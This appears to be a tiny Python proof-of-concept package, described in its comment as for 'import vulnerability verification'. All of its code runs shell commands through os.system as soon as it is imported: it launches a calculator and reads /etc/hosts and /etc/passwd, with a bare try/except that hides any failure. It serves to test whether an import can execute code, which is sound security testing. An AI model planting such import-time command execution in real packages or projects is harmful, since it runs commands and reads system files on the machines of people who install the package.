#This is a package for one import vulnerability verification

try:
    __import__('os').system('calc')
    __import__('os').system('cat /etc/hosts')
    __import__('os').system('cat /etc/passwd')
except:
    pass
